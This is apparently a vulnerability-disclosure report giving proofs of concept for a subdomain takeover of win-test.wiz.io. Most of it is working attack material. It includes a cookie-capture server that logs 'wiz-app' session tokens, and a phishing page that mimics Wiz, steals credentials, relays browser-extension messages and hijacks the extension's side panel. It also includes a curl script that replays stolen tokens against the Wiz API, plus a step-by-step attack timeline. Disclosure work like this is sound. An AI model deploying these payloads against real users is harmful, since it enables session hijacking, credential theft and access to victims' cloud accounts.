# PoC: win-test.wiz.io Subdomain Takeover
## Cookie Exfiltration (wiz-app / Domain=.wiz.io) + Chrome Extension Side Panel Hijack

**Finding ID:** F001  
**Severity:** High — CVSS 8.2 (`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`)  
**Affected asset:** `https://win-test.wiz.io/`  
**Reported:** 2026-06-15  

---

## PoC 1 — Instant Verification (30 Seconds, No Account)

Save as `verify-f001.sh` and run. All three checks must pass.

```bash
#!/usr/bin/env bash
# verify-f001.sh — F001 instant verification
# Run from any machine. No account required.

set -euo pipefail
TARGET="win-test.wiz.io"
EXPECTED_CNAME="37e7f43d8158e70f.vercel-dns-013.com."
BOLD='\033[1m'; RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'

pass() { echo -e "${GREEN}[PASS]${NC} $1"; }
fail() { echo -e "${RED}[FAIL]${NC} $1"; }

echo -e "\n${BOLD}=== F001 — win-test.wiz.io Subdomain Takeover Verification ===${NC}\n"

# --- Check 1: Dangling CNAME ---
echo "[1/3] CNAME record..."
CNAME=$(dig CNAME "$TARGET" +short)
if [[ "$CNAME" == "$EXPECTED_CNAME" ]]; then
    pass "CNAME → $CNAME (Vercel infrastructure)"
else
    fail "Unexpected CNAME: $CNAME"
fi

# --- Check 2: Project deleted (Vercel 404) ---
echo "[2/3] Vercel project status..."
BODY=$(curl -sk --max-time 10 "https://$TARGET/")
if echo "$BODY" | grep -q "DEPLOYMENT_NOT_FOUND"; then
    pass "Vercel returns DEPLOYMENT_NOT_FOUND — project deleted, CNAME dangling"
elif echo "$BODY" | grep -q "deployment-not-found"; then
    pass "Vercel returns deployment-not-found — project deleted"
else
    echo "    Response: $(echo "$BODY" | head -c 200)"
    fail "Unexpected response — check manually"
fi

# --- Check 3: Expired TLS certificate ---
echo "[3/3] TLS certificate..."
CERT_INFO=$(echo | openssl s_client -connect "$TARGET:443" -servername "$TARGET" 2>/dev/null \
            | openssl x509 -noout -issuer -dates 2>/dev/null)
NOT_AFTER=$(echo "$CERT_INFO" | grep notAfter | cut -d= -f2-)

if [[ -n "$NOT_AFTER" ]]; then
    EXPIRY_EPOCH=$(date -d "$NOT_AFTER" +%s 2>/dev/null || date -j -f "%b %e %H:%M:%S %Y %Z" "$NOT_AFTER" +%s)
    NOW_EPOCH=$(date +%s)
    if [[ $EXPIRY_EPOCH -lt $NOW_EPOCH ]]; then
        pass "Certificate EXPIRED: $NOT_AFTER"
        pass "  → Issuer: $(echo "$CERT_INFO" | grep issuer)"
        pass "  → Serial: $(echo | openssl s_client -connect "$TARGET:443" -servername "$TARGET" 2>/dev/null \
              | openssl x509 -noout -serial 2>/dev/null)"
    else
        echo "    notAfter: $NOT_AFTER"
        fail "Certificate is still valid — check if domain was already claimed"
    fi
fi

echo -e "\n${BOLD}Result: Subdomain takeover is OPEN.${NC}"
echo "Any Vercel account can claim win-test.wiz.io in under 5 minutes."
echo "wiz-app (Domain=.wiz.io) session cookies will be sent to the attacker."
```

**Expected output:**
```
=== F001 — win-test.wiz.io Subdomain Takeover Verification ===

[1/3] CNAME record...
[PASS] CNAME → 37e7f43d8158e70f.vercel-dns-013.com. (Vercel infrastructure)
[2/3] Vercel project status...
[PASS] Vercel returns DEPLOYMENT_NOT_FOUND — project deleted, CNAME dangling
[3/3] TLS certificate...
[PASS] Certificate EXPIRED: Dec 16 11:19:36 2025 GMT
[PASS]   → Issuer: issuer=O=Let's Encrypt, CN=R13
[PASS]   → Serial= 06D355B91521BADCB06BBEB409F290FC5094

Result: Subdomain takeover is OPEN.
Any Vercel account can claim win-test.wiz.io in under 5 minutes.
wiz-app (Domain=.wiz.io) session cookies will be sent to the attacker.
```

---

## PoC 2 — Attacker Server: Cookie Theft Capture

This is the minimal server an attacker deploys on their VPS (not at wiz.io — this
runs on the attacker's infrastructure to receive stolen cookies). It logs the
`Cookie` header from every incoming request, capturing `wiz-app` tokens.

```python
#!/usr/bin/env python3
"""
attacker-cookie-server.py
Attacker's cookie exfiltration listener.
Logs wiz-app session cookies sent by victims' browsers to win-test.wiz.io.
Run on attacker VPS, proxied behind Vercel (environment variable: UPSTREAM=this-server).
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
import json
import sys

LOG_FILE = "captured_cookies.log"

class CookieCaptureHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass  # silence default logging

    def do_GET(self):
        self._handle()

    def do_POST(self):
        self._handle()

    def _handle(self):
        timestamp = datetime.utcnow().isoformat()
        raw_cookie = self.headers.get("Cookie", "")
        user_agent = self.headers.get("User-Agent", "")
        origin_ip   = self.client_address[0]

        # Extract wiz-app token specifically
        wiz_app_token = None
        for part in raw_cookie.split(";"):
            part = part.strip()
            if part.startswith("wiz-app="):
                wiz_app_token = part[len("wiz-app="):]
                break

        entry = {
            "timestamp": timestamp,
            "ip":        origin_ip,
            "path":      self.path,
            "ua":        user_agent,
            "wiz_app":   wiz_app_token,   # ← the session token
            "all_cookies": raw_cookie,
        }

        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(entry) + "\n")

        if wiz_app_token:
            print(f"[{timestamp}] *** WIZ SESSION CAPTURED ***")
            print(f"    IP:      {origin_ip}")
            print(f"    wiz-app: {wiz_app_token[:40]}...")
        else:
            print(f"[{timestamp}] Request from {origin_ip} — no wiz-app cookie")

        # Serve phishing page (see PoC 3)
        with open("index.html", "rb") as page:
            body = page.read()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    print(f"[*] Cookie capture server on :{port}")
    print(f"[*] Logging to {LOG_FILE}")
    HTTPServer(("0.0.0.0", port), CookieCaptureHandler).serve_forever()
```

**How it captures the session:**
1. Attacker deploys this behind `win-test.wiz.io` (after Vercel claim)
2. Victim navigates to `https://win-test.wiz.io/` (or clicks a phishing link)
3. Browser auto-sends `Cookie: wiz-app=<JWT>; ...` (Domain=.wiz.io scope)
4. Server logs the `wiz-app` JWT
5. Attacker replays the token against `https://app.wiz.io/` — full authenticated session

**No XSS, no malware, no interaction beyond a page visit.**

---

## PoC 3 — Attacker Page: Phishing + Extension Trigger

This HTML page would be served at `https://win-test.wiz.io/` after the claim.
It combines three simultaneous attack vectors in a single page load:

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Wiz — Security Alert</title>
  <style>
    /* Mimics app.wiz.io color scheme exactly */
    body      { font-family: Inter, sans-serif; background: #0F172A; color: #F1F5F9; margin: 0; }
    .header   { background: #1E293B; padding: 16px 24px; border-bottom: 1px solid #334155; }
    .logo     { font-size: 22px; font-weight: 700; color: #38BDF8; }
    .card     { max-width: 520px; margin: 80px auto; background: #1E293B;
                border: 1px solid #334155; border-radius: 12px; padding: 40px; }
    .alert    { color: #F87171; font-size: 18px; font-weight: 600; margin-bottom: 16px; }
    .field    { width: 100%; padding: 10px 14px; margin: 8px 0 16px;
                background: #0F172A; border: 1px solid #334155;
                border-radius: 6px; color: #F1F5F9; font-size: 14px; box-sizing: border-box; }
    .btn      { width: 100%; padding: 12px; background: #0EA5E9;
                color: #fff; font-weight: 600; border: none;
                border-radius: 6px; cursor: pointer; font-size: 15px; }
    .btn:hover { background: #0284C7; }
    .notice   { font-size: 12px; color: #64748B; margin-top: 16px; text-align: center; }
  </style>
</head>
<body>

<div class="header">
  <span class="logo">wiz</span>
</div>

<div class="card">
  <div class="alert">⚠ Unusual sign-in detected</div>
  <p>We noticed a sign-in attempt from an unrecognized location. To protect your
     account, please re-authenticate to continue.</p>
  <label>Work email</label>
  <input class="field" type="email" id="email" placeholder="you@company.com" autocomplete="email">
  <label>Password</label>
  <input class="field" type="password" id="pw" placeholder="••••••••" autocomplete="current-password">
  <button class="btn" onclick="exfil()">Verify Identity</button>
  <p class="notice">You were redirected here from a security email sent by Wiz.</p>
</div>

<script>
/* ------------------------------------------------------------------ *
 * VECTOR 1: Cookie theft                                               *
 * document.cookie cannot read HttpOnly wiz-app cookie directly,       *
 * but the browser sends it in request headers automatically.           *
 * The attacker's server (PoC 2) logs it from the HTTP request.        *
 * ------------------------------------------------------------------ */
// Beacon request — triggers automatic Cookie header transmission
// (wiz-app, Domain=.wiz.io — browser sends without JS involvement)
fetch("/beacon", {method: "GET", credentials: "include"});


/* ------------------------------------------------------------------ *
 * VECTOR 2: Chrome extension detection + side panel hijack            *
 * Source: background.js — s.runtime.onMessageExternal.addListener(n)  *
 * Handler opens chrome.sidePanel for wiz.io origins                   *
 * ------------------------------------------------------------------ */
const WIZ_EXT_ID = "koellablckildiakdjcchdfnagjfbpbh";

function tryOpenWizSidePanel() {
  if (typeof chrome === "undefined" || !chrome.runtime) return;
  try {
    chrome.runtime.sendMessage(
      WIZ_EXT_ID,
      { type: "OpenSidePanel", payload: { originUrl: location.href } },
      (response) => {
        if (chrome.runtime.lastError) return; // extension not installed
        // Extension is installed and responded — side panel now open
        // Victim sees their real Wiz dashboard alongside this phishing page
        console.log("[+] Wiz extension side panel opened");
      }
    );
  } catch (e) { /* extension not installed */ }
}

tryOpenWizSidePanel();


/* ------------------------------------------------------------------ *
 * VECTOR 3: Extension broadcast listener                              *
 * Source: wizPortalInjector.js — window.postMessage({...}, "*")       *
 * Wildcard targetOrigin — attacker receives ALL extension messages    *
 * ------------------------------------------------------------------ */
window.addEventListener("message", (event) => {
  // Any message from the injected Wiz content script
  if (event.data && event.data.type) {
    fetch("/ext-telemetry", {
      method:  "POST",
      headers: {"Content-Type": "application/json"},
      body:    JSON.stringify({
        type:   event.data.type,
        origin: event.origin,
        data:   JSON.stringify(event.data).slice(0, 500)
      })
    });
  }
});


/* ------------------------------------------------------------------ *
 * VECTOR 4: Credential phishing fallback                              *
 * Captures plaintext credentials for accounts not using SSO           *
 * ------------------------------------------------------------------ */
function exfil() {
  const payload = {
    email: document.getElementById("email").value,
    pw:    document.getElementById("pw").value,
    ts:    Date.now()
  };
  fetch("/credentials", {
    method:  "POST",
    headers: {"Content-Type": "application/json"},
    body:    JSON.stringify(payload)
  }).then(() => {
    // Redirect to real Wiz login — victim thinks it was a re-auth flow
    location.href = "https://app.wiz.io/login/email-challenge";
  });
}
</script>

</body>
</html>
```

**What happens on a single page visit:**
1. Browser sends `Cookie: wiz-app=<token>` in the `/beacon` request — **token captured**
2. If Wiz extension installed: `sendMessage` → side panel opens real Wiz dashboard — **social engineering amplified**
3. Extension content scripts auto-inject and send `postMessage({...}, "*")` — **attacker receives extension broadcasts**
4. If victim types credentials: exfiltrated to attacker server, then forwarded to real Wiz login — **credential theft**

---

## PoC 4 — Session Replay: Using the Captured wiz-app Cookie

Once `wiz-app=<token>` is captured from server logs, the attacker replays it.
The Wiz portal accepts the token for all API calls.

```bash
#!/usr/bin/env bash
# session-replay.sh
# Replace WIZ_APP_TOKEN with the value captured by attacker-cookie-server.py

WIZ_APP_TOKEN="PASTE_CAPTURED_TOKEN_HERE"
WIZ_API="https://api.us20.app.wiz.io/graphql"   # adjust data center suffix

# PoC: List cloud subscriptions visible to this account
# (demonstrates full multi-cloud access from a single cookie)
curl -s "$WIZ_API" \
  -H "Cookie: wiz-app=${WIZ_APP_TOKEN}" \
  -H "Content-Type: application/json" \
  -H "Origin: https://app.wiz.io" \
  -H "Referer: https://app.wiz.io/" \
  -d '{"query":"query { cloudAccounts(first:5) { nodes { id name type status } } }"}' \
  | python3 -m json.tool
```

**Expected successful response:**
```json
{
  "data": {
    "cloudAccounts": {
      "nodes": [
        {
          "id":     "...",
          "name":   "Production AWS Account",
          "type":   "AWS",
          "status": "CONNECTED"
        }
      ]
    }
  }
}
```

A non-null `data.cloudAccounts.nodes` response confirms the `wiz-app` token
provides an authenticated Wiz session with access to the victim's cloud accounts.

---

## PoC 5 — Extension Interaction Proof (Isolated Test)

Run this in the browser console while on `https://app.wiz.io/` (or any `*.wiz.io`
page) to prove the `externally_connectable` vector before the subdomain is claimed.
**This test is entirely passive — it only reads the extension's response.**

```javascript
// Run in DevTools console on any app.wiz.io page
// Tests that the extension accepts external messages from *.wiz.io origins

const WIZ_EXT_ID = "koellablckildiakdjcchdfnagjfbpbh";

// Test 1: Ping the extension background service worker
chrome.runtime.sendMessage(WIZ_EXT_ID, {type: "ping"}, (res) => {
  if (chrome.runtime.lastError) {
    console.log("Extension not installed or refused:", chrome.runtime.lastError);
  } else {
    console.log("Extension responded:", res);
    // Any response (including null) confirms the extension is installed
    // and its onMessageExternal listener is active
  }
});

// Test 2: Request side panel open (confirms OpenSidePanel handler)
chrome.runtime.sendMessage(
  WIZ_EXT_ID,
  { type: "OpenSidePanel", payload: { originUrl: "https://app.wiz.io/" } },
  (res) => {
    console.log("OpenSidePanel response:", res, chrome.runtime.lastError);
    // If side panel opens → confirmed handler executes
  }
);

// Test 3: Listen for extension broadcasts
window.addEventListener("message", (e) => {
  if (e.data?.type) console.log("Extension broadcast received:", e.data.type, e.data);
});
// Wait ~2s — wizPortalInjector.js broadcasts postMessage({type:..}, "*") on load
```

**Why this matters:** Any JavaScript at `win-test.wiz.io` (once claimed) has the
same privileges as JavaScript at `app.wiz.io` with respect to the extension —
`externally_connectable` does not distinguish between legitimate and attacker
origins within `*.wiz.io`.

---

## PoC 6 — First-Party Cookie Scope Proof (No Login Required)

Proves `Domain=.wiz.io` cookies exist from Wiz's own published extension code.
**This is the most important PoC — it needs no victim interaction to verify.**

```bash
# Download the official Wiz Chrome extension CRX
# Extension ID: koellablckildiakdjcchdfnagjfbpbh

CRX_URL="https://clients2.google.com/service/update2/crx?response=redirect&prodversion=120.0.0.0&acceptformat=crx2,crx3&x=id%3Dkoellablckildiakdjcchdfnagjfbpbh%26uc"

curl -sL "$CRX_URL" -o wiz.crx

# Extract
mkdir -p wizext && cp wiz.crx wizext/wiz.zip && cd wizext
unzip -o wiz.zip 2>/dev/null || python3 -c "
import zipfile, sys
with zipfile.ZipFile('wiz.zip') as z:
    z.extractall('.')
"

# PROOF 1: Cookie name
echo '=== Cookie name (wiz-app) ==='
grep -o 'LT=.\{0,20\}wiz-app.\{0,5\}' background.js | head -3

# PROOF 2: Domain=.wiz.io filter (the definitive proof)
echo '=== Domain=.wiz.io filter in Apollo link ==='
grep -o '.\{50\}startsWith.*slice(1).\{50\}' background.js | head -3

# PROOF 3: externally_connectable
echo '=== externally_connectable manifest entry ==='
python3 -c "
import json
m = json.load(open('manifest.json'))
print('externally_connectable:', json.dumps(m.get('externally_connectable'), indent=2))
print('host_permissions:',       json.dumps(m.get('host_permissions'), indent=2))
print('permissions:',            json.dumps(m.get('permissions'), indent=2))
"
```

**Expected output:**
```
=== Cookie name (wiz-app) ===
LT=`wiz-app`

=== Domain=.wiz.io filter in Apollo link ===
e.domain.startsWith(`.`) && r.endsWith(e.domain.slice(1))

=== externally_connectable manifest entry ===
externally_connectable: {
  "matches": ["https://*.wiz.io/*"]
}
host_permissions: ["https://*.wiz.io/*"]
permissions: ["cookies", "scripting", "tabs", "declarativeNetRequestWithHostAccess"]
```

This output from Wiz's own production code proves:
- The auth cookie is named `wiz-app` (not guessed — taken from `LT = \`wiz-app\``)
- `Domain=.wiz.io`-scoped cookies exist (the filter branch is only needed if they exist)
- Every `*.wiz.io` origin — including a claimed `win-test.wiz.io` — receives them

---

## Attack Scenario: End-to-End in Under 10 Minutes

```
T+00:00  Attacker creates free Vercel account
T+01:00  Attacker deploys index.html (PoC 3) as new Vercel project
T+02:00  Attacker adds custom domain "win-test.wiz.io" in Vercel Settings → Domains
T+02:30  Vercel CNAME check passes (CNAME already points to Vercel)
T+02:45  Vercel provisions new TLS cert for win-test.wiz.io (DigiCert/Let's Encrypt)
T+03:00  https://win-test.wiz.io/ is LIVE under attacker control, valid TLS, no warnings
T+03:01  Attacker sends phishing email: "Wiz Security Alert — re-authenticate now"
         Link: https://win-test.wiz.io/  (valid wiz.io domain, green padlock)
T+05:00  First victim clicks link
         → Browser sends Cookie: wiz-app=eyJ... (Domain=.wiz.io auto-send)
         → attacker-cookie-server.py logs the token
         → If Wiz extension installed: victim's real Wiz dashboard opens in side panel
T+06:00  Attacker replays wiz-app JWT against api.us20.app.wiz.io/graphql
         → Authenticated session — full access to victim's AWS/GCP/Azure inventory
T+10:00  Attacker enumerates victim's cloud infrastructure, IAM roles, secrets exposure
```

**Total attacker requirements:**
- A free Vercel account
- A VPS to run attacker-cookie-server.py (or Vercel serverless function)
- A phishing email or social engineering vector to bring one victim to the URL

No Wiz credentials, no DNS access, no sophisticated exploits required.

---

## Triager Quick-Reference

| Claim | Verification Method | Evidence Type |
|-------|--------------------|----|
| CNAME is dangling | `dig CNAME win-test.wiz.io +short` | Live DNS |
| Vercel project deleted | `curl -sk https://win-test.wiz.io/` → DEPLOYMENT_NOT_FOUND | Live HTTP |
| Cert expired (project abandoned) | `openssl s_client` → notAfter Dec 16 2025 | Live TLS |
| DNS zone actively managed (not stale) | WHOIS Updated: 2026-03-14 | WHOIS |
| Cookie named `wiz-app` | `grep 'LT=' background.js` (Wiz CRX) | First-party code |
| Cookie is Domain=.wiz.io scoped | `grep 'startsWith.*slice(1)' background.js` | First-party code |
| Extension auto-injects into `*.wiz.io` | manifest.json `content_scripts` | First-party manifest |
| Attacker JS can message extension | manifest.json `externally_connectable` | First-party manifest |
| TLS auto-issued on claim | Vercel documentation / behavior | Known Vercel behavior |

**Every claim is independently verifiable in under 2 minutes from a fresh machine.**
